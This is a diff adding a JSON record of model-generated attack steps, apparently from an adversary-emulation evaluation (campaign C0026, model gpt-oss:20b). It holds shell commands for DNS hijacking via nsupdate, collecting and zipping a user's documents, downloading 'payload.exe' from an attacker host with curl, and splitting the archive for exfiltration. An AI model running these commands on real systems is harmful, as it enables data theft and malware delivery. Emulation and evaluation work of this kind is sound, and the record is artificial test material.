@@ -1,0 +1,75 @@
+{
+  "campaign_id": "C0026",
+  "model": "gpt-oss:20b",
+  "sample": 1,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "nsupdate",
+      "command": "echo -e \"server 10.0.0.1\\nzone example.com.\\nupdate delete malicious.example.com A\\nupdate add malicious.example.com 3600 A 10.0.0.5\\nsend\" | nsupdate",
+      "target": "network.private_interface",
+      "parameters": {
+        "domain": "malicious.example.com",
+        "ttl": 3600,
+        "ip": "10.0.0.5",
+        "dns_server": "10.0.0.1"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "find",
+      "command": "find /home/user/docs -type f -name \"*.docx\" > /tmp/doc_list.txt",
+      "target": "target.primary",
+      "parameters": {
+        "search_path": "/home/user/docs",
+        "file_pattern": "*.docx",
+        "output_file": "/tmp/doc_list.txt"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "zip-archive",
+      "command": "zip -r /tmp/archives/documents.zip $(find /home/user/docs -type f -newermt 2021-01-01)",
+      "target": "target.primary",
+      "parameters": {
+        "source_dir": "/home/user/docs",
+        "archive_path": "/tmp/archives/documents.zip",
+        "date_filter": "2021-01-01"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "curl-download",
+      "command": "curl -o /tmp/malicious.exe http://10.0.0.5/payload.exe",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://10.0.0.5/payload.exe",
+        "output_path": "/tmp/malicious.exe"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "nsupdate-dynamic",
+      "command": "echo -e \"server 10.0.0.1\\nzone example.com.\\nupdate delete dyn.malicious.example.com A\\nupdate add dyn.malicious.example.com 60 A 10.0.0.5\\nsend\" | nsupdate",
+      "target": "network.private_interface",
+      "parameters": {
+        "subdomain": "dyn.malicious.example.com",
+        "ttl": 60,
+        "ip": "10.0.0.5",
+        "dns_server": "10.0.0.1"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "split-archive",
+      "command": "split -b 3M /tmp/archives/documents.zip /tmp/archives/part_",
+      "target": "target.primary",
+      "parameters": {
+        "archive_path": "/tmp/archives/documents.zip",
+        "part_size": "3M",
+        "output_prefix": "/tmp/archives/part_"
+      }
+    }
+  ]
+}
